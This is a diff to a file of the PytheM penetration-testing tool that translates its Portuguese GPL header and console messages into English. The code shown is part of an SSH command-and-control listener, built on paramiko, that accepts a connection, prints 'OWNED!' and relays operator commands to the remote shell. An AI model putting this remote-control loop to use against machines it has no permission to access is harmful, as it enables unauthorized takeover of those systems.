@@ -3,20 +3,21 @@
 
 # Copyright (c) 2016 m4n3dw0lf
 #
-# Este arquivo é parte do programa PytheM
-
-# PytheM é um software livre; você pode redistribuí-lo e/ou 
-# modificá-lo dentro dos termos da Licença Pública Geral GNU como 
-# publicada pela Fundação do Software Livre (FSF); na versão 3 da 
-# Licença, ou (na sua opinião) qualquer versão.
-
-# Este programa é distribuído na esperança de que possa ser  útil, 
-# mas SEM NENHUMA GARANTIA; sem uma garantia implícita de ADEQUAÇÃO
-# a qualquer MERCADO ou APLICAÇÃO EM PARTICULAR. Veja a
-# Licença Pública Geral GNU para maiores detalhes.
-
-# Você deve ter recebido uma cópia da Licença Pública Geral GNU junto
-# com este programa, Se não, veja <http://www.gnu.org/licenses/>.
+# This file is part of the program PytheM
+#
+# PytheM is free software; you can redistribute it and/or
+# modify it under the terms of the GNU General Public License as
+# published by the Free Software Foundation; either version 3 of the
+# License, or (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful, but
+# WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
+# General Public License for more details.
+# You should have received a copy of the GNU General Public License
+# along with this program; if not, write to the Free Software
+# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
+# USA
 
 
 import paramiko
@@ -49,12 +50,12 @@ class Server(paramiko.ServerInterface):
 			sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 			sock.bind((self.server, self.port))
 			sock.listen(100)
-			print "[+] Esperando por conexoes ..."
+			print "[+] Waiting for connections ..."
 			client, addr = sock.accept()
 		except Exception, e:
-			print "[-] Falha na conexao: "+str(e)
+			print "[-] Connection failed: "+str(e)
 			sys.exit(1)
-		print "[+] Conexao estabelecida!"
+		print "[+] Connection established!"
 
 		try:
 			Session = paramiko.Transport(client)
@@ -64,25 +65,25 @@ class Server(paramiko.ServerInterface):
 			try:
 				Session.start_server(server=server)
 			except paramiko.SSHException, x:
-				print '[-] Negociacao SSH falhou.'
+				print '[-] SSH negotiation failed.'
 			chan = Session.accept(10)
-			print '[+] Autenticado!'
+			print '[+] Authenticated!'
 			chan.send("OWNED!")
 			while 1:
 				try:
-					command = raw_input("comando> ").strip('\n')
+					command = raw_input("command> ").strip('\n')
 					if command != 'exit':
 						chan.send(command)
 						print chan.recv(1024) + '\n'
 					else:
 						chan.send('exit')
-						print '[*] Saindo ...'
+						print '[*] Exiting ...'
 						Session.close()
 						raise Exception('exit')
 				except KeyboardInterrupt:
 					Session.close()
 		except Exception, e:
-			print "[-] Deu ruim!: " + str(e)
+			print "[-] Ouch!: " + str(e)
 			try:
 				Session.close()
 			except:
